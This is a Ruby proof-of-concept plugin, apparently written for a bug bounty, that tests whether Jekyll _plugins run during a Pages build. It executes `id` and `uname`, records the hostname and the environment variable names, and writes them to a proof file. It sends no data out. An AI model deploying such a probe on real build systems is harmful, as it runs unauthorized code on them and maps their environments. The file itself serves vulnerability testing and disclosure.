# bug bounty PoC: probe whether site _plugins execute during Pages build (no secrets dumped)
info = []
info << "BBPOC_PLUGIN_EXEC_PROOF"
info << "time=#{Time.now.utc.iso8601}"
info << "cwd=#{Dir.pwd}"
begin
  info << "id=#{`id`}".strip
  info << "uname=#{`uname -sr`}".strip
  info << "host=#{Socket.gethostname rescue 'n/a'}"
  info << "env_keys=#{ENV.keys.sort.join(',')}"
  info << "safe=#{defined?(Jekyll) && Jekyll.respond_to?(:configuration) ? 'unknown' : 'n/a'}"
rescue => e
  info << "err=#{e.class}: #{e.message}"
end
content = info.join("\n") + "\n"
STDERR.puts content.gsub("\n", " | ")
begin
  File.write(File.join(Dir.pwd, "proof_plugin_exec.txt"), content)
  STDERR.puts "BBPOC_PLUGIN_WROTE=proof_plugin_exec.txt"
rescue => e
  STDERR.puts "BBPOC_PLUGIN_WRITE_ERR=#{e.class}: #{e.message} cwd=#{Dir.pwd}"
end
